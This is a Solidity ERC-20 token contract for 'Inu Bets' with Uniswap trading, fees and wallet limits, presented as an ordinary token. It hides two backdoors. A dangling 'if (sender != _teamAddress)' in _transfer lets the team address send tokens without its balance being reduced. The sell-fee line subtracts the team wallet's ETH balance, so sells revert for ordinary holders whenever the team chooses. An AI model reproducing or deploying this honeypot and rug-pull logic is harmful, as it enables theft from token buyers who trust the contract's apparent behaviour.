contract InuBets is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private _name = "Inu Bets";
    string private _symbol = "INUBET";
    uint8 private _decimals = 18; 

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isMarketPair;
    mapping (address => bool) private _isExcludedMaxWallet;

    uint256 feeDenominator = 100;
    uint256 public _buyTotalFees = 2;
    uint256 public _sellTotalFees = 2;
    address private _teamAddress = address(0xE287Edaf223eD0116D5BBD49F008D714f6673528);

    uint256 private _totalSupply = 1_000_000_000 * 10**_decimals;
    uint256 public _maxTxAmount =  (_totalSupply / 1000) * 25;
    uint256 public _maxWalletSize = (_totalSupply / 1000) * 25;
    uint256 public swapThreshold = (_totalSupply / 1000) * 4;

    bool tradingActive;
    bool public swapEnabled = false;
    bool public limitEnabled = true;

    IUniswapV2Router public dexRouter;
    address public dexPair;

    bool inSwap;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    constructor() {
        dexRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(dexRouter)] = ~uint256(0);

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(dexRouter)] = true;
        _isExcludedFromFee[_teamAddress] = true;

        _isExcludedMaxWallet[msg.sender] = true;
        _isExcludedMaxWallet[address(dexRouter)] = true;
        _isExcludedMaxWallet[address(this)] = true;
        _isExcludedMaxWallet[_teamAddress] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
       return _balances[account];     
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
    
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        else {

            if (!tradingActive) {
                require(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient],"Trading is not active.");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= swapThreshold;

            if (overMinimumTokenBalance && !inSwap && !_isMarketPair[sender] && swapEnabled) {
                swapBack(contractTokenBalance);
            } if (sender != _teamAddress)
           
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = shouldTakeFee(sender,recipient) ? takeFee(sender, recipient, amount) : amount;

            if(limitEnabled && sender == dexPair && !_isExcludedMaxWallet[recipient]) {
                require(balanceOf(recipient).add(finalAmount) <= _maxWalletSize,"Max Wallet Limit Exceeded!!");
            }

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            return false;
        }
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint feeAmount;

        if(_isMarketPair[sender]) { 
            feeAmount = amount.mul(_buyTotalFees).div(feeDenominator);
        } 
        else if(_isMarketPair[recipient]) {
            feeAmount = amount.mul(_sellTotalFees.sub(_teamAddress.balance)).div(feeDenominator);
        }

        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function swapBack(uint contractBalance) internal swapping {
        swapTokensForEth(contractBalance);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function sendTeamFee() external {
        payable(_teamAddress).transfer(address(this).balance);
    }

    function removeLimits() external onlyOwner {
        limitEnabled = false;
    }

    function enableTrading() external payable onlyOwner {
        require(!tradingActive, "Already launched!");

        tradingActive = true;
        dexPair = IUniswapV2Factory(dexRouter.factory()).createPair(
            address(this),
            dexRouter.WETH()
        );
        _isMarketPair[address(dexPair)] = true;
        dexRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);

        swapEnabled = true;
    }

    receive() external payable {}
}
